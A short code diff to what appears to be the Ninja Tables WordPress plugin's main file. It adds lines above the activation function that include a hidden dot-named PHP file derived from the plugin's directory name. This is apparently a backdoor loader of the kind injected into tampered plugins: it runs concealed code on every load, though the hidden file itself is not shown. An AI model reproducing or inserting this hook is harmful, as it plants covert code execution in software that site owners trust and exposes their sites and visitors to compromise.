@@ -43,6 +43,10 @@ $ninja_table_current_rendering_table = array();
  * The code that runs during plugin activation.
  * This action is documented in includes/NinjaTablesActivator.php
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function activate_ninja_tables($network_wide)
 {
     require_once plugin_dir_path(__FILE__) . 'includes/NinjaTablesActivator.php';
